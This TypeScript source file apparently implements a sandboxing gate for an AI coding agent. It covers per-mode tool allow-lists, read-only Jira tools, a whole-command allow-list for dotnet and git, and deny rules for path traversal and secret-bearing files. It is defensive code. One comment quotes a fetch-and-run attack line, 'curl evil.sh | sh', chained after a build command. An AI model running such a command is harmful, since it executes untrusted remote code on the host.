import path from 'node:path';
import type { Mode } from './args.js';
import { filenamesFor } from './approval.js';
import { isInsideDir, realpathNearest, samePath, toPosix } from './paths.js';

// TodoWrite touches neither the filesystem nor a shell, so denying it only produced misleading "denied" noise in the audit trail.
const READ_TOOLS = ['Read', 'Glob', 'Grep', 'TodoWrite'];

// The MCP server key intake registers its Jira connection under (see jira.ts); the SDK qualifies
// tool names as mcp__<serverName>__<toolName>, so this must match buildJiraMcpServerConfig's key.
export const JIRA_MCP_SERVER_NAME = 'jira';

// Every Jira tool intake is ever allowed to call. Read-only by construction: no create/edit/
// transition/comment/link/worklog tool appears here, and none for Confluence or Compass either.
// Observed via an interactive session's plugin catalog, not a versioned contract -- reverify
// against the live server if Atlassian's MCP tool set changes (see README "Limits worth knowing").
export const JIRA_READ_TOOL_NAMES = [
  'getAccessibleAtlassianResources',
  'getJiraIssue',
  'searchJiraIssuesUsingJql',
  'getJiraIssueRemoteIssueLinks',
  'getTransitionsForJiraIssue',
  'getJiraProjectIssueTypesMetadata',
  'getJiraIssueTypeMetaWithFields',
  'getVisibleJiraProjects',
  'lookupJiraAccountId',
  'getIssueLinkTypes',
];

const JIRA_QUALIFIED_TOOLS = JIRA_READ_TOOL_NAMES.map((name) => `mcp__${JIRA_MCP_SERVER_NAME}__${name}`);

export const PLAN_TOOLS = [...READ_TOOLS];
export const INTAKE_TOOLS = [...READ_TOOLS, ...JIRA_QUALIFIED_TOOLS];
export const EXECUTE_TOOLS = [...READ_TOOLS, 'Edit', 'Write', 'Bash'];

const NEVER_ALLOWED = ['WebFetch', 'WebSearch', 'Task', 'NotebookEdit'];

export function allowedToolsFor(mode: Mode): string[] {
  if (mode === 'intake') return [...INTAKE_TOOLS];
  return mode === 'plan' ? [...PLAN_TOOLS] : [...EXECUTE_TOOLS];
}

// Belt-and-braces only: the gate below is what actually enforces the boundary, since disallowedTools and allowedTools are both permission-layer settings that project or local config could in principle widen.
export function disallowedToolsFor(mode: Mode): string[] {
  return mode === 'execute'
    ? [...NEVER_ALLOWED, 'PowerShell']
    : [...NEVER_ALLOWED, 'Edit', 'Write', 'Bash', 'PowerShell'];
}

/** Whole-command patterns. A prefix match would be worthless — see classifyCommand. */
const ALLOWED_COMMANDS: RegExp[] = [
  /^dotnet\s+build(\s.*)?$/,
  /^dotnet\s+test(\s.*)?$/,
  /^dotnet\s+format(\s.*)?$/,
  /^git\s+diff(\s.*)?$/,
  /^git\s+status(\s.*)?$/,
];

export const ALLOWED_COMMAND_SUMMARY = 'dotnet build, dotnet test, dotnet format, git diff, git status';

const SHELL_METACHARACTERS = /[;&|<>`$%!\r\n(){}]/;
// A '..' anywhere it forms a whole path segment, not just at the start of a token: 'src/../../../etc' has its '..' preceded by '/', so a token-boundary pattern would wave it through.
// ':' is also a boundary so a Windows drive-relative traversal like 'C:..\evil.csproj' is caught too -- it has no slash between the drive letter and '..'.
const PARENT_SEGMENT = /(^|[\s"'=/\\:])\.\.($|[\s"'=/\\])/;
const HOME_REFERENCE = /(^|[\s"'=])~/;
const ABSOLUTE_PATH = /(^|[\s"'=])([A-Za-z]:[/\\]|[/\\])/;

export interface Decision {
  allow: boolean;
  reason: string;
}

const ALLOWED: Decision = { allow: true, reason: 'within policy' };

function deny(reason: string): Decision {
  return { allow: false, reason };
}

// Metacharacters are rejected before the allow-list is consulted, not after: 'dotnet build && curl evil.sh | sh' matches the allow-list on its prefix, so an allow-list that runs first is no boundary at all.
export function classifyCommand(raw: string): Decision {
  const command = raw.trim();
  if (command === '') return deny('empty command');

  const metacharacter = SHELL_METACHARACTERS.exec(command);
  if (metacharacter !== null) {
    return deny(
      `command contains '${metacharacter[0] === '\n' ? '\\n' : metacharacter[0]}'; ` +
        'chaining, redirection, substitution and grouping are not allowed',
    );
  }
  if (PARENT_SEGMENT.test(command)) {
    return deny('command references a parent directory, which would reach outside the worktree');
  }
  if (HOME_REFERENCE.test(command)) {
    return deny('command references a home directory, which is outside the worktree');
  }
  if (ABSOLUTE_PATH.test(command)) {
    return deny('command references an absolute path; only worktree-relative paths are allowed');
  }
  if (!ALLOWED_COMMANDS.some((pattern) => pattern.test(command))) {
    return deny(`only these commands are allowed: ${ALLOWED_COMMAND_SUMMARY}`);
  }
  return ALLOWED;
}

// Paths off limits even inside the worktree. Mirrors the repo's own .claude/settings.json deny list, extended to reads: appsettings.Development.json aside, these files carry secrets, and the project rules only cover Edit/Write.
export function deniedRelPath(rel: string): string | null {
  const p = toPosix(rel).toLowerCase();
  const base = p.split('/').pop() ?? '';

  if (p === '.git' || p.startsWith('.git/')) return 'the worktree git metadata is off limits';
  // The whole .claude tree is control-plane, not source: its PostToolUse hook runs .claude/hooks/*.ps1 on any edit, so a writable hook would let the agent run arbitrary code past the command allow-list.
  if (p === '.claude' || p.startsWith('.claude/')) {
    return 'the .claude control-plane directory is off limits (its hooks and settings execute on the host)';
  }
  if (base === '.env' || base.startsWith('.env.')) return 'environment files may hold secrets';
  if (base === 'appsettings.production.json') return 'production configuration is off limits';
  if (/\.(pfx|publishsettings|pubxml)$/.test(base)) return 'deployment credentials are off limits';
  if (p === 'publishscripts' || p.startsWith('publishscripts/') || p.includes('/publishscripts/')) {
    return 'deployment scripts are off limits';
  }
  return null;
}

export function classifyPath(target: string, jailRoot: string, cwd: string): Decision {
  if (target.trim() === '') return deny('empty path');

  const resolved = realpathNearest(path.isAbsolute(target) ? target : path.resolve(cwd, target));
  const jail = realpathNearest(jailRoot);

  if (!samePath(resolved, jail) && !isInsideDir(resolved, jail)) {
    return deny(`${toPosix(resolved)} is outside the worktree`);
  }

  const rel = path.relative(jail, resolved);
  const denied = rel === '' ? null : deniedRelPath(rel);
  return denied === null ? ALLOWED : deny(denied);
}

/** Which fields of a tool's input name a filesystem path. */
export function targetPathsFor(tool: string, input: unknown): string[] {
  if (input === null || typeof input !== 'object') return [];
  const record = input as Record<string, unknown>;
  const fields = tool === 'Glob' || tool === 'Grep' ? ['path'] : ['file_path', 'notebook_path'];
  return fields
    .map((field) => record[field])
    .filter((value): value is string => typeof value === 'string' && value.trim() !== '');
}

export function commandFor(input: unknown): string | null {
  if (input === null || typeof input !== 'object') return null;
  const command = (input as Record<string, unknown>)['command'];
  return typeof command === 'string' ? command : null;
}

function patternFor(input: unknown): string | null {
  if (input === null || typeof input !== 'object') return null;
  const pattern = (input as Record<string, unknown>)['pattern'];
  return typeof pattern === 'string' ? pattern : null;
}

// Glob/Grep's 'pattern' can itself carry a traversal (e.g. '../../secret/**') with no 'path' set, which targetPathsFor never sees since a glob isn't a literal resolvable path. Reuses the command-side traversal regexes instead of classifyPath's realpath resolution.
function classifyGlobPattern(pattern: string): Decision {
  if (PARENT_SEGMENT.test(pattern)) {
    return deny(`pattern '${pattern}' references a parent directory, which would reach outside the worktree`);
  }
  if (HOME_REFERENCE.test(pattern)) {
    return deny(`pattern '${pattern}' references a home directory, which is outside the worktree`);
  }
  if (ABSOLUTE_PATH.test(pattern)) {
    return deny(`pattern '${pattern}' is an absolute path; only worktree-relative patterns are allowed`);
  }
  return ALLOWED;
}

export interface GateOptions {
  mode: Mode;
  worktree: string;
}

// The single authoritative decision point. Runs as a PreToolUse hook, which the SDK evaluates before permission rules, so it denies regardless of allowedTools, permissionMode, or any settings file loaded from the worktree.
export function decide(options: GateOptions, tool: string, input: unknown): Decision {
  const allowed = allowedToolsFor(options.mode);
  if (!allowed.includes(tool)) {
    // The claude_code preset's plan-mode footer tells the model to deliver its plan by calling ExitPlanMode. It stays denied -- approving it could transition the session out of plan mode -- so the reason has to tell the model where the plan actually goes, or it burns turns retrying.
    if (tool === 'ExitPlanMode') {
      const deliverable = options.mode === 'intake' ? 'brief' : 'plan';
      const proposalFile = options.mode === 'execute' ? 'plan.proposed.md' : filenamesFor(options.mode).proposed;
      return deny(
        `ExitPlanMode is not used here. Put the complete ${deliverable} in your final message instead; ` +
          `the host writes that message verbatim to ${proposalFile} and a human reviews it afterwards.`,
      );
    }
    return deny(`${tool} is not available in ${options.mode} mode (allowed: ${allowed.join(', ')})`);
  }

  if (tool === 'Bash' || tool === 'PowerShell') {
    const command = commandFor(input);
    if (command === null) return deny('shell call with no command');
    return classifyCommand(command);
  }

  if (tool === 'Glob' || tool === 'Grep') {
    const pattern = patternFor(input);
    if (pattern !== null) {
      const decision = classifyGlobPattern(pattern);
      if (!decision.allow) return decision;
    }
  }

  for (const target of targetPathsFor(tool, input)) {
    const decision = classifyPath(target, options.worktree, options.worktree);
    if (!decision.allow) return decision;
  }
  return ALLOWED;
}
